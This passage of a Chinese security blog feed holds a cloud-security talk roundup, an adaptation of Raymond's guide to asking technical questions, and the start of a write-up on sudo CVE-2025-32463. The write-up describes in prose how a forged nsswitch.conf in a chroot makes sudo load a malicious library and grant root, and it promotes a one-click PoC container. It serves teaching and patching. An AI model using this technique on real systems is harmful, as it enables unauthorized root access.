环境中实施出口控制的挑战</li><li>数据边界策略实践：SCP 与 RCP 的落地经验</li><li>“我没注册这个”：解读 Google Artifact Registry 的真实内容</li><li>引入 GRC 工程：开启 AWS 合规新纪元</li><li>邀请者威胁：新型云部署模型下的安全管理</li><li>企业合并收购期间，如何保障云环境安全</li><li>日志没你想的有用：解析 IaC 中的身份归属</li><li>ML 和 LLMOps 部署安全：平台架构师的引入经验</li><li>GPU 共享安全：<a href="http://fly.io/" title="Fly.io">Fly.io</a> 的经验总结</li><li>好的、坏的和漏洞百出的 GCP 租户项目解析</li><li>这工作不是我报名的：从零构建生产级 AWS 环境</li><li>你不是 Netflix：如何正确借鉴大会演讲内容</li></ol><h3 id="其它：开场与闭幕（2-场演讲）"><a href="#其它：开场与闭幕（2-场演讲）" class="headerlink" title="其它：开场与闭幕（2 场演讲）"></a>其它：开场与闭幕（2 场演讲）</h3><p>作为大会的收尾，为与会者提供背景与幕后花絮。我特别喜欢这种透明感。</p><h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><p>很多大会的演讲其实都很有料，但说实话，大多数人根本挤不出 20 分钟去一场场点开看。更尴尬的是——你压根不知道讲的内容是不是你关心的方向。</p><p>我们找到了这份 fwd:cloudsec 2025 的演讲资料，希望能帮你<strong>快速判断哪些值得点开深入看，哪些可以先跳过</strong>，节省时间、直奔干货。</p><p>如果你觉得这份整理对你有帮助，也欢迎转发给朋友一起看，让更多人少踩坑、多吸收点实战知识！</p>]]></content>
    
    
    
    <tags>
      
      <tag>云安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何像高手一样提问</title>
    <link href="/2025/07/30/%E5%A6%82%E4%BD%95%E5%83%8F%E9%AB%98%E6%89%8B%E4%B8%80%E6%A0%B7%E6%8F%90%E9%97%AE/"/>
    <url>/2025/07/30/%E5%A6%82%E4%BD%95%E5%83%8F%E9%AB%98%E6%89%8B%E4%B8%80%E6%A0%B7%E6%8F%90%E9%97%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>近期，我学习了一份关于如何提问的文章，分享给大家一起看看。这份指南由 Eric S. Raymond 和 Rick Moen 撰写，已被广泛引用，是开发者圈公认的“提问圣经”。中文译文基于原文 3.10 版，大家可以通过 <a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/pulls">PR</a> 或 <a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/issues">issue</a> 参与翻译改进。</p><p>原文地址：<a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/README-zh_CN.md">https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/README-zh_CN.md</a></p><h2 id="0x01-提问前：先查找、先思考"><a href="#0x01-提问前：先查找、先思考" class="headerlink" title="0x01 提问前：先查找、先思考"></a>0x01 提问前：先查找、先思考</h2><p>当您准备通过电子邮件、群聊或聊天室提出技术问题前，请先做到以下事情：</p><ol><li><strong>先搜搜看别人有没有遇到过</strong>，论坛、Issue、博客都逛一圈，说不定别人已经解决了。</li><li><strong>网上搜一搜关键词</strong>，别着急问，“百度&#x2F;Google 一下”有时候能立马解决问题。</li><li><strong>看看项目的使用说明或文档</strong>，里面一般会讲清楚怎么用、常见问题有哪些。</li><li><strong>找找有没有 FAQ（常见问题列表）</strong>，很多坑作者早就总结好了。</li><li><strong>自己多动手试试</strong>，换个参数、换个环境跑一下，说不定就摸索出来了。</li><li><strong>问问身边懂的人</strong>，同事、朋友、师兄师姐也许一下就能点醒你。</li><li><strong>如果你懂点编程，就翻翻源码</strong>，很多时候问题的答案就藏在代码里。</li></ol><h3 id="1-1-提问前，先把功课做足一点点"><a href="#1-1-提问前，先把功课做足一点点" class="headerlink" title="1.1 提问前，先把功课做足一点点"></a>1.1 提问前，先把功课做足一点点</h3><p>在你开口问问题之前，最好先让别人知道：<strong>你已经努力找过答案了</strong>，而不是一上来就伸手。这样别人更愿意帮你，也能看出你是一个愿意学习、尊重他人时间的人。</p><p>比如你可以这么做：</p><ul><li>在 Google 上搜索你遇到的报错信息或关键词（包括论坛、网页、旧贴子）。</li><li>阅读官方文档、FAQ 或手册，看是不是已经有了解答。</li><li>自己动手试了几种方法，比如改参数、换环境、加打印看看日志。</li><li>如果你搜不到答案，也可以顺手写一句：  “我在 Google 上搜了<code>XXX</code>和<code>YYY</code>，但没找到有用的信息。”</li></ul><p>这样不仅能帮别人更快理解你卡在哪里了，也可能帮将来遇到相同问题的人通过搜索找到你的提问。</p><h3 id="1-2-不要着急，认真思考你的问题"><a href="#1-2-不要着急，认真思考你的问题" class="headerlink" title="1.2 不要着急，认真思考你的问题"></a>1.2 不要着急，认真思考你的问题</h3><p>别指望 10 秒钟的搜索就能解决一个复杂问题。在你决定“发问”的那一刻，不妨：</p><ul><li>稍微放松一下，坐好，回顾一下你遇到的问题；</li><li>仔细琢磨下问题本质是什么；</li><li>把想问的东西<strong>整理清楚再发出来</strong>；</li><li>尽量不要一股脑甩一大堆没整理好的信息。</li></ul><p>因为：<strong>草率的问题只会换来草率的回答，甚至没人回答。</strong></p><h3 id="1-3-提问时，尽量别带错方向"><a href="#1-3-提问时，尽量别带错方向" class="headerlink" title="1.3 提问时，尽量别带错方向"></a>1.3 提问时，尽量别带错方向</h3><p>如果你提出的问题是基于一个错误的假设，那有经验的人可能会用一些“表面回答”引导你，希望你自己能从中反思——而不是直接给你“你想听的答案”。</p><p>所以提问前，不妨先确认：</p><ul><li>你理解的问题背景是否准确；</li><li>是不是从现象中推导出了一个错误的结论；</li><li>你的提问是否只是想让别人帮你“复制粘贴”一个解决方案。</li></ul><h3 id="1-4-你不“配”被回答，但你可以“赢得”答案"><a href="#1-4-你不“配”被回答，但你可以“赢得”答案" class="headerlink" title="1.4 你不“配”被回答，但你可以“赢得”答案"></a>1.4 你不“配”被回答，但你可以“赢得”答案</h3><p>没人有义务回答你的问题，尤其是当你没付出努力时。但如果你能提出一个<strong>清晰、有逻辑、有趣、能启发别人思考的问题</strong> —— 那么你可能不仅会得到帮助，还会为整个社区留下价值。</p><p>换句话说：<strong>用你自己的努力和思考，去“换”一个别人愿意投入时间的答复。</strong></p><h3 id="1-5-比“要答案”更好的，是“要方向”"><a href="#1-5-比“要答案”更好的，是“要方向”" class="headerlink" title="1.5 比“要答案”更好的，是“要方向”"></a>1.5 比“要答案”更好的，是“要方向”</h3><p>如果你还不知道怎么提具体问题，那就换个方式说，比如：</p><ul><li>“我尝试了 X 和 Y，但效果不对，是不是哪里还需要注意？”</li><li>“我是不是漏掉了什么条件？”</li><li>“我查了一圈，还是搞不明白这个环节的原理，能不能给点方向？”</li></ul><p>这些问题<strong>比“你帮我写一下代码吧”更容易获得别人真心的帮助。</strong></p><h2 id="0x02-提问时：结构化-有礼貌"><a href="#0x02-提问时：结构化-有礼貌" class="headerlink" title="0x02 提问时：结构化 + 有礼貌"></a>0x02 提问时：结构化 + 有礼貌</h2><h3 id="2-1-选对地方，提对方式（提问前的准备）"><a href="#2-1-选对地方，提对方式（提问前的准备）" class="headerlink" title="2.1 选对地方，提对方式（提问前的准备）"></a>2.1 <strong>选对地方，提对方式</strong>（提问前的准备）</h3><h4 id="慎选提问的地方"><a href="#慎选提问的地方" class="headerlink" title="慎选提问的地方"></a>慎选提问的地方</h4><p>别随便在哪个平台发问，尤其是主题不对的地方。比如：</p><ul><li>在普通用户论坛里问很专业的问题，或在高级技术群里问新手问题。</li><li>多个地方重复发同样问题也不好。</li><li>叫陌生人私信你，通常也不会挺热情。</li></ul><p>要做的是：先确认你的问题属哪个平台最合适，再搜索该论坛的 FAQ、历史贴，了解文化后再提问。</p><h4 id="别要求私聊"><a href="#别要求私聊" class="headerlink" title="别要求私聊"></a>别要求私聊</h4><p>不要要求回复私信或邮件。公开问答对大家都有益，也让帮助过你的人获得成就感。如果你觉得回复会太多雷同，可以说“如果回复很多，请发邮件给我整理”。</p><h4 id="标题里不要写“紧急”"><a href="#标题里不要写“紧急”" class="headerlink" title="标题里不要写“紧急”"></a>标题里不要写“紧急”</h4><p>写“紧急”往往适得其反：让人反感，甚至被过滤。除非你知道你的问题核心是热门话题且迅速能引发专业关注，否则尽量不要用“急”“紧急”等标签。</p><h3 id="2-2-标题与表达技巧（提问时的形式）"><a href="#2-2-标题与表达技巧（提问时的形式）" class="headerlink" title="2.2 标题与表达技巧（提问时的形式）"></a>2.2 标题与表达技巧（提问时的形式）</h3><h4 id="标题要简洁明确"><a href="#标题要简洁明确" class="headerlink" title="标题要简洁明确"></a>标题要简洁明确</h4><p>50 字以内，精准表达问题。标题里不要写“救命”“急”等情绪词，而是用“目标 – 差异”的方式说明问题：<strong>是什么期望？哪里不对？</strong> 比如：Python 3.11 asyncio 重复 await 导致 RuntimeError，而不是“快救我！”</p><h4 id="去掉无意义结尾语"><a href="#去掉无意义结尾语" class="headerlink" title="去掉无意义结尾语"></a>去掉无意义结尾语</h4><p>不要写“有没有人能帮我？”、“有人看懂吗？”那会让人觉得内容不专业。好的问题本身就够清晰，不需要这种填充语。</p><h4 id="礼貌有时真有帮助"><a href="#礼貌有时真有帮助" class="headerlink" title="礼貌有时真有帮助"></a>礼貌有时真有帮助</h4><p>说“请”与“谢谢”，说明你尊重别人的时间。礼貌不会代替内容，但恰当表达感谢更能赢得好感，为你下一次提问加分。</p><h3 id="2-3-内容清晰，结构合理（提问时的内容组织）"><a href="#2-3-内容清晰，结构合理（提问时的内容组织）" class="headerlink" title="2.3 内容清晰，结构合理（提问时的内容组织）"></a>2.3 内容清晰，结构合理（提问时的内容组织）</h3><h4 id="语言要清晰规范"><a href="#语言要清晰规范" class="headerlink" title="语言要清晰规范"></a>语言要清晰规范</h4><p>认真注意拼写、标点、大小写，别全大写、别用火星文。若在英文平台提问时，尽量用英语，并可以注明：“English is not my native language; please excuse typos.”</p><p>这样既表现尊重，也让人更愿意帮助你。</p><h4 id="按时间顺序写问题过程"><a href="#按时间顺序写问题过程" class="headerlink" title="按时间顺序写问题过程"></a>按时间顺序写问题过程</h4><p>把从开始到出问题整个过程按顺序写清楚。日志／命令行记录截几行重点，加上时间线说明，这样别人才能快速定位问题节点。</p><h4 id="先说目标，再说你卡在哪一步"><a href="#先说目标，再说你卡在哪一步" class="headerlink" title="先说目标，再说你卡在哪一步"></a>先说目标，再说你卡在哪一步</h4><p>不要只贴过程。比如不是问“我怎么写代码”，而是在开头写你想实现的目标，再说明你卡在哪个步骤，这样别人更容易帮你。</p><h4 id="问题需求写清楚"><a href="#问题需求写清楚" class="headerlink" title="问题需求写清楚"></a>问题需求写清楚</h4><p>明确说明你想让别人做什么：是给思路、看代码、检查补丁，还是提供调试建议？越具体越好。需要思考方向比直接要解决方案更容易获得帮助。</p><h3 id="2-4-展示思考，降低成本（便于他人理解并提供帮助）"><a href="#2-4-展示思考，降低成本（便于他人理解并提供帮助）" class="headerlink" title="2.4 展示思考，降低成本（便于他人理解并提供帮助）"></a>2.4 展示思考，降低成本（便于他人理解并提供帮助）</h3><h4 id="让别人容易回复"><a href="#让别人容易回复" class="headerlink" title="让别人容易回复"></a>让别人容易回复</h4><p><strong>别让回答者费劲</strong>。不要最后写“私信我回复地址”或“请发邮件给我”，论坛里人多，默认回复即可。发帖后如果需要回复提醒，直接使用“追踪”功能即可。</p><h4 id="错误描述要具体、有用"><a href="#错误描述要具体、有用" class="headerlink" title="错误描述要具体、有用"></a>错误描述要具体、有用</h4><p>列出你的操作步骤、环境信息、报错日志，并说明你进行过哪些调查和尝试。这让别人可以快速定位问题，并准确回答。最好能提供可以<strong>重现问题</strong>的步骤或代码片段。</p><h4 id="精炼信息，不要冗长堆砌"><a href="#精炼信息，不要冗长堆砌" class="headerlink" title="精炼信息，不要冗长堆砌"></a>精炼信息，不要冗长堆砌</h4><p>贴出问题时，不需要把一大堆内容都贴上去。精简到能展示问题核心，既表明你做了功课，又帮助别人理解重点。缩小问题范围往往自己也能找到答案。</p><h4 id="别急着说“这是个-Bug”"><a href="#别急着说“这是个-Bug”" class="headerlink" title="别急着说“这是个 Bug”"></a>别急着说“这是个 Bug”</h4><p>除非你能提供代码 patch 或回归测试证明这个问题是软件本身的缺陷，否则先把问题当你自己写错或配置有误来看待。即使你后来发现真是 bug，礼貌一点也比冒犯维护者强。</p><h4 id="不要卑微乞求式提问"><a href="#不要卑微乞求式提问" class="headerlink" title="不要卑微乞求式提问"></a>不要卑微乞求式提问</h4><p>“我只是个菜鸟，求求你帮我…”这样的语气既没效率，也不易赢得善意。与其卑微，不如清楚描述背景、出问题的地方，让别人觉得你是认真的。</p><h4 id="描述事实症状，别下结论"><a href="#描述事实症状，别下结论" class="headerlink" title="描述事实症状，别下结论"></a>描述事实症状，别下结论</h4><p>别把你的猜测当作问题本身。遇到错误时，只说“发生了什么”，把结论留给回答者。如果你一定要讲推测，也请注明“这只是我的猜测”并解释为什么你这么想。</p><h4 id="询问代码问题时：一定贴最简示例"><a href="#询问代码问题时：一定贴最简示例" class="headerlink" title="询问代码问题时：一定贴最简示例"></a>询问代码问题时：一定贴最简示例</h4><p>贴几十行，说明第几行期望什么，实际是什么，配一个最简可复现的代码段。如果你想别人 review 某块代码，也请在开头注明特别关注哪一部分。</p><h4 id="家庭作业题别直接贴"><a href="#家庭作业题别直接贴" class="headerlink" title="家庭作业题别直接贴"></a>家庭作业题别直接贴</h4><p>如果你觉得这是作业题，先想办法自己做再发。在提问时你可以请求“提示方向”或“检查思路”，而不是直接求答案。</p><h3 id="2-5-善始善终（提问后的良好习惯）"><a href="#2-5-善始善终（提问后的良好习惯）" class="headerlink" title="2.5 善始善终（提问后的良好习惯）"></a>2.5 <strong>善始善终</strong>（提问后的良好习惯）</h3><p>如果你的问题被解决了，记得在原帖上补一句：“问题已解决，原因是…感谢大家！”这样既对帮助过你的人表达谢意，也让后来者快速识别无须重复解决。</p><p>总之，一个好的提问不是简单地“发问”，而是经过思考与准备的“思考输出”。提问前多花点心思，你会更容易获得帮助，也会被更多人尊重。</p><h2 id="0x03-提问后：冷静解读、吸收反馈"><a href="#0x03-提问后：冷静解读、吸收反馈" class="headerlink" title="0x03 提问后：冷静解读、吸收反馈"></a>0x03 提问后：冷静解读、吸收反馈</h2><h3 id="3-1-学会“读懂”别人怎么回答你"><a href="#3-1-学会“读懂”别人怎么回答你" class="headerlink" title="3.1 学会“读懂”别人怎么回答你"></a>3.1 学会“读懂”别人怎么回答你</h3><p>你可能会看到一些简短又让人抓狂的回复，比如：</p><ul><li>自己读手册去（Read The Fucking Manual，简称 RTFM）</li><li>自己上网搜（Search The Fucking Web，简称 STFW）</li></ul><p>说白了，就是对方觉得：<strong>“这问题太基础了，网上随便一搜、看下文档就有答案。”</strong></p><p>虽然听起来有点粗鲁，但其实这类人通常还会贴上链接或说明书章节，说明他不是在敷衍你，而是希望你<strong>先动脑再动嘴</strong>，独立解决问题。</p><p>他们这样做，其实是在“硬核地”帮助你成长。</p><h3 id="3-2-如果你看不懂他们说的是什么？"><a href="#3-2-如果你看不懂他们说的是什么？" class="headerlink" title="3.2 如果你看不懂他们说的是什么？"></a>3.2 如果你看不懂他们说的是什么？</h3><p>别急着回一句：“这啥意思啊？”  </p><p>正确的做法是：</p><ol><li>自己先搜一下关键词；</li><li>查查相关文档、论坛历史贴；</li><li>实在不懂，再具体问！</li></ol><p>比如别人说：“你可能是 zentry 锁住了，先清一下。”  </p><p>你别直接问：“zentry 是啥？”  </p><p>你可以说：“我看了下文档，只看到 -z 和 -p 提到 zentry，但没讲清楚怎么清除，是指这个吗？”</p><p><strong>表现出你努力了，对方才更愿意帮你。</strong></p><h3 id="3-3-面对“看起来”无礼的回答"><a href="#3-3-面对“看起来”无礼的回答" class="headerlink" title="3.3 面对“看起来”无礼的回答"></a>3.3 面对“看起来”无礼的回答</h3><p>技术圈的氛围偏直接、效率导向，不太讲究“温柔”。  </p><p>很多时候，那些看起来凶巴巴的回复，其实只是希望事情能快点搞定，而不是故意怼你。</p><p>如果你觉得被冒犯了，先冷静下来。</p><p>但！如果有人真的言语攻击你，也别忍着，怼回去也行。但前提是你确定对方确实无理，别把技术交流变成口水战。</p><p>总之，如果你不是黑客，你可能会觉得他们脑子不太正常。但说实话，他们自己也觉得没啥毛病。他们更关心问题能不能搞定，而不是你舒不舒服。</p><h3 id="3-4-避免扮演失败者"><a href="#3-4-避免扮演失败者" class="headerlink" title="3.4 避免扮演失败者"></a>3.4 避免扮演失败者</h3><ul><li>被指责或言语攻击时，别哭诉、叫嚷、投诉或威胁。</li><li>公开批评是社区维护质量的手段，接受批评是成长的过程。</li><li>高礼节禁言批评只会让社区变得无用。</li><li>你该选择的是“友善”还是“有用”？别把两者混为一谈。</li><li>被批评是关心你和社区的表现，至少表现出尊严和感谢。</li></ul><h3 id="3-5-识别无理攻击与避免口水战"><a href="#3-5-识别无理攻击与避免口水战" class="headerlink" title="3.5 识别无理攻击与避免口水战"></a>3.5 识别无理攻击与避免口水战</h3><ul><li>有时会遇到无缘无故的挑衅，别放在心上。</li><li>不要卷入无意义的争吵，除非对方有明确恶意且你准备好反击。</li><li>记住黑客社区风格直接、务实，不必期待温情脉脉。</li></ul><h3 id="3-6-蠢问题示例及其背后的原因"><a href="#3-6-蠢问题示例及其背后的原因" class="headerlink" title="3.6 蠢问题示例及其背后的原因"></a>3.6 蠢问题示例及其背后的原因</h3><ul><li>不做搜索直接问“在哪找 X？”、“怎么用 X 做 Y？”等低效问题。</li><li>诸如“我的程序没用”、“Windows 有问题”等模糊问题缺乏信息且难以回答。</li><li>想要“破解”或“黑别人”的问题完全不可接受。</li></ul><h3 id="3-7-聪明提问的特点"><a href="#3-7-聪明提问的特点" class="headerlink" title="3.7 聪明提问的特点"></a>3.7 聪明提问的特点</h3><ul><li>说明已做过的调查（比如搜索、看过手册、FAQ）。</li><li>提供环境、错误日志、具体细节。</li><li>诚实不推责，态度谦虚。</li><li>给出具体示例，表现出解决问题的能力。</li></ul><h3 id="3-8-如果没得到回答怎么办"><a href="#3-8-如果没得到回答怎么办" class="headerlink" title="3.8 如果没得到回答怎么办"></a>3.8 如果没得到回答怎么办</h3><ul><li>耐心等待，考虑时区差异和提问的质量。</li><li>避免重复发帖或喧哗。</li><li>寻找其他适合初学者的帮助渠道和本地用户组。</li><li>商业技术支持虽然收费但常常更有效。</li></ul><h2 id="0x04-如何更好地回答别人问题"><a href="#0x04-如何更好地回答别人问题" class="headerlink" title="0x04 如何更好地回答别人问题"></a>0x04 如何更好地回答别人问题</h2><ul><li>态度和善，避免公开羞辱初犯。</li><li>不确定时坦诚说明，不乱指路。</li><li>不开玩笑误导，尊重提问者。</li><li>适当反问，引导提问者提供更多信息。</li><li>即使说“RTFM”，最好给出具体文档或搜索建议。</li><li>给出有建设性的答案，推荐好工具和方法。</li><li>帮助社区将好的答案写入 FAQ，减少重复。</li><li>授人以渔，展示思考和解决问题的思路。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>效率提升</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从 CVE-2025-32463 谈及 chroot 的容器隔离安全性</title>
    <link href="/2025/07/30/%E4%BB%8E-CVE-2025-32463-%E8%B0%88%E5%8F%8A-chroot-%E7%9A%84%E5%AE%B9%E5%99%A8%E9%9A%94%E7%A6%BB%E5%AE%89%E5%85%A8%E6%80%A7/"/>
    <url>/2025/07/30/%E4%BB%8E-CVE-2025-32463-%E8%B0%88%E5%8F%8A-chroot-%E7%9A%84%E5%AE%B9%E5%99%A8%E9%9A%94%E7%A6%BB%E5%AE%89%E5%85%A8%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>2025 年 6 月，<code>sudo</code> 被曝史诗级本地提权漏洞 CVE-2025-32463。本文用不仅提供了容器化漏洞复现环境，可一键启动漏洞环境并运行 PoC 脚本直取 <code>root</code> 权限；还能手把手教您攻防细节，提高个人技术水平并学习企业级别的应用防护知识。此外，本文还附赠容器底层技术原理，了解容器是如何通过 <code>--chroot</code> 实现根文件系统切换的？其隔离性如何？</p><p>本文是笔者在腾讯云开发者先锋（简称 TDP）的直播内容，可关注视频号【腾云先锋】查看直播回放。读完本文，您不仅能对 CVE-2025-32463 漏洞有个全面的认知，还能对容器的沙箱隔离有个初步的了解。</p><p><img src="/image/image_xZJ3pkERK7.png" alt="图 1：直播回放查看通道" title="图 1：直播回放查看通道"></p><h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>在开始本次分享之前，我们需要简要了解一些技术背景知识，以便在后续的漏洞解析和 <code>chroot</code> 安全性评估中能够更好地理解内容：</p><ul><li>什么是 <code>sudo</code> ；</li><li>什么是 <code>chroot</code> ；</li><li><code>sudo</code> 的 <code>--chroot</code> 参数有何作用。</li></ul><h3 id="1-1-sudo-简介"><a href="#1-1-sudo-简介" class="headerlink" title="1.1 sudo 简介"></a>1.1 sudo 简介</h3><p><code>sudo</code> 的全称是“superuser do”，意思是能够以超级用户的身份执行命令。<code>sudo</code> 允许用户在不共享 <code>root</code> 密码的情况下，暂时以 <code>root</code> 权限执行命令并记录这些操作以方便问责。</p><p>如图 2 所示，<code>yaney</code> 用户可通过 <code>sudo</code> 命令，在执行命令时暂时将权限提升至 <code>root</code>，而且我们可以查看<code>/var/log/auth.log</code> 文件，了解 <code>sudo</code> 执行的命令、时间和用户等信息，这对于日志审计和攻击溯源来说是非常有用的。</p><p><img src="/image/image_oerGcu_F5X.png" alt="图 2：sudo 的主要功能演示" title="图 2： sudo 的主要功能演示"></p><h3 id="1-2-chroot-简介"><a href="#1-2-chroot-简介" class="headerlink" title="1.2 chroot 简介"></a>1.2 chroot 简介</h3><p><code>chroot</code> 主要的功能就是更改当前进程的根目录。当根目录被更改后，当前进程及其子进程只能访问比新根目录层次更低的文件和目录。例如：若主机上存在以下目录和文件：</p><ul><li>&#x2F;some&#x2F;directory&#x2F;on&#x2F;host&#x2F;file1</li><li>&#x2F;some&#x2F;directory&#x2F;on&#x2F;host&#x2F;dir1&#x2F;file2</li></ul><p>当我们将当前进程的根目录指向 <code>/some/directory/on/host</code> 时，当前进程的最高文件层级就被设置为 <code>/some/directory/on/host</code> ，这样一来，除了以下文件和目录，我们将无法访问其它任一文件层级：</p><ul><li>&#x2F;file1</li><li>&#x2F;dir1&#x2F;file2</li></ul><p>查看 <code>chroot</code> 手册时，我们可以了解到：<code>chroot</code> 不仅可以更改根目录，还能执行命令。若没有指定命令，则默认以可交互的方式执行系统所设置的 SHELL。</p><p><img src="/image/image_FgzZgRFeRe.png" alt="图 3：chroot 的手册" title="图 3： chroot 的手册"></p><p>如图 4 所示，当我们创建一个没有任何内容的新目录<code>new_root</code>并 <code>chroot</code> 到该目录中时，无论我们是否追加命令，都会运行失败。根据报错信息，我们知道，这是因为 <code>new_root</code> 目录并未包含<code>/bin/bash</code> 文件，也无法找到 <code>ls</code> 等命令。为了解决这个问题，我们需要将所要运行的命令文件放在 <code>new_root</code> 目录中。</p><p><img src="/image/image_PJ-R6fO4VM.png" alt="图 4：chroot 的主要功能演示" title="图 4： chroot 的主要功能演示"></p><p>在 SFTP&#x2F;FTP 的使用场景中，我们若想用户在文件传输期间仅能访问主目录，通常使用 <code>chroot</code> 将 FTP 进程的根目录设置为<code>/home/user</code>，以防止恶意用户访问<code>/etc/passwd</code>等敏感文件。</p><p>但 <code>chroot</code>不隔离内核能力、不清理环境变量、以及不屏蔽系统调用权限，导致用户仍然可以通过各种方式打破隔离，我们将本文的第三部分对 <code>chroot</code> 的隔离进行安全评估。</p><h3 id="1-3-sudo-的-–chroot-参数"><a href="#1-3-sudo-的-–chroot-参数" class="headerlink" title="1.3 sudo 的 –chroot 参数"></a>1.3 sudo 的 –chroot 参数</h3><p>在大多数系统中，<code>chroot</code> 命令需要以 <code>root</code> 权限执行。若普通用户需要使用 <code>chroot</code> 命令，我们需要授予其 <code>root</code> 权限，但这严重违反了最小权限原则。当然，我们也可以通过 <code>sudo</code> 执行 <code>chroot</code> 命令（即 <code>sudo chroot</code>），但这仍然给予了普通用户完整的 <code>root</code> 权限。例如，我们可以执行下述命令 <code>chroot</code> 到某个目录中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chroot</span> /path/to/dir /bin/bash<br></code></pre></td></tr></table></figure><p>但实际上 <code>chroot</code>只是将当前进程的根目录更改为我们所设置的路径<code>/path/to/dir</code>，然后以 <code>root</code> 权限执行 <code>/bin/bash</code>，这样一来，我们就在新的根目录下以 <code>root</code> 权限执行任何命令。如果目标目录是用户控制的，风险会更大。</p><p>2020 年 9 月 29 日，<code>sudo</code>在 1.9.3 版本中引入了 <code>--chroot</code> 参数，这样一来，我们就可以将目标目录限制在单个目录中了，详情请看 <code>sudo</code> 的<a href="https://www.sudo.ws/releases/stable/#1.9.3" title="发版记录">发版记录</a>。</p><p><img src="/image/image_yfvH8U0Gux.png" alt="图 5：sudo 的 --chroot 参数" title="图5： sudo 的 --chroot 参数"></p><p><code>sudo</code> 的内置的 <code>--chroot</code> 功能默认不启用，我们必须在 <code>sudoers</code> 文件中明确启用。此外，无论 <code>--chroot</code>是否运行成功，<code>sudo</code> 都会详细记录在日志中，这对于日志审计和攻击溯源特别有用，详情请看官方博客<a href="https://www.sudo.ws/posts/2020/09/using-chroot-and-cwd-in-sudo/" title="《Using chroot and cwd in sudo》">《Using chroot and cwd in sudo》</a>。</p><p><img src="/image/image_yVJ1S-PQA1.png" alt="图 6：sudo --chroot 的官方使用手册" title="图6： sudo --chroot 的官方使用手册"></p><h2 id="0x02-CVE-2025-32463-漏洞解析"><a href="#0x02-CVE-2025-32463-漏洞解析" class="headerlink" title="0x02 CVE-2025-32463 漏洞解析"></a>0x02 CVE-2025-32463 漏洞解析</h2><p>有了第一部分的知识回顾，现在我们就可以对 CVE-2025-32463 漏洞进行深入解析了，解析内容包括：</p><ul><li>如何对漏洞的大致情况进行简单地描述；</li><li>如何快速启动漏洞环境并进行漏洞利用；</li><li>如何快速验证当前环境是否受漏洞影响；</li><li>如何搭建漏洞环境并一步步地进行漏洞利用；</li><li>如何对公司资产进行影响面排查；</li><li>如何对资产的环境进行排查；</li><li>如何从源码层面分析漏洞的成因以及修复措施。</li></ul><h3 id="2-1-漏洞描述"><a href="#2-1-漏洞描述" class="headerlink" title="2.1 漏洞描述"></a>2.1 漏洞描述</h3><p>2025 年 6 月 30 日，<a href="https://www.stratascale.com/" title="Stratascale">Stratascale</a> 网络研究部门 (CRU) 的 <a href="https://x.com/0xm1rch" title="Rich Mirch">Rich Mirch</a>在 <code>sudo</code> 中发现了两个权限提升漏洞，均可将系统权限提升到 <code>root</code> 权限，分别是：</p><ul><li><a href="https://www.stratascale.com/vulnerability-alert-CVE-2025-32462-sudo-host" title="《CVE-2025-32462：sudo 的 --host 权限提升漏洞》">《CVE-2025-32462：sudo 的 –host 权限提升漏洞》</a></li><li><a href="https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot" title="《CVE-2025-32463：sudo 的 --chroot 权限提升漏洞》">《CVE-2025-32463：sudo 的 –chroot 权限提升漏洞》</a></li></ul><p><code>--host</code> 和 <code>--chroot</code> 都是 <code>sudo</code> 中不常用的参数，而本次分享我们只讨论其中的 CVE-2025-32463 漏洞，该漏洞无需定义任何 <code>sudo</code> 规则，即可将普通用户的权限提升至 <code>root</code> 权限，我们将在本文的【2.2 快速开始】中说明，如何一键启动漏洞环境，并使用其中的 PoC 脚本快速提权。</p><p>根据最初的安全公告数据，已明确得知 <code>sudo</code>的 1.9.14 至 1.9.17 版本均受其影响，但并非所有版本都经过测试。我们将在本文的【2.3 漏洞验证】中说明，如何快速验证漏洞是否存在。</p><p>此外，我们将在本文的【2.4 环境搭建】和【2.5 漏洞利用】中实操一遍攻击流程：</p><ul><li>攻击者自定义<code>/etc/nsswitch.conf</code>配置文件内容，诱导 <code>sudo</code> 加载指定根目录下的恶意动态链接库；</li><li>然后使用 <code>sudo</code> 的 <code>--chroot</code> 参数切换到 <code>chroot</code> 环境，自动加载恶意动态链接库，从而实现以 <code>root</code> 权限执行任意命令。</li></ul><p>该漏洞已在 1.9.17p1 中得到了修复，因此请安装<code>sudo</code> 1.9.17p1 或更高版本。我们会在【2.6 影响面排查】中详细说明，如何快速对各种企业资产进行影响面排查，以及常见的误区是什么。</p><p>若影响面排查无法生效，那么我们需要对当前环境进行排查，详情请看【2.7 环境排查】。若这些内容对于您来说太简单了，并且还想对漏洞进行深入的分析和研究，我们将在【2.8 源码分析】中进行详细说明。</p><h3 id="2-2-快速开始"><a href="#2-2-快速开始" class="headerlink" title="2.2 快速开始"></a>2.2 快速开始</h3><p>如图 7 所示，为了方便所有人都可以一键进行漏洞复现，不用担心环境的问题。我已经将漏洞环境和 PoC 打包成容器镜像，方便大家操作。</p><p><img src="/image/image_iGbGssSCye.png" alt="图 7：受漏洞影响的容器镜像环境" title="图7：受漏洞影响的容器镜像环境"></p><p>镜像共有<code>deb</code> 和 <code>source</code> 两个版本，其中 <code>deb</code> 版本的 <code>sudo</code> 是基于 <code>deb</code> 包安装的，<code>source</code> 版本的 <code>sudo</code>是基于源码自行构建的。这两个版本的漏洞复现效果都相同，我们随意拉取其中一个即可。</p><ol><li><p>随意拉取其中一个版本的镜像到本地运行；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it 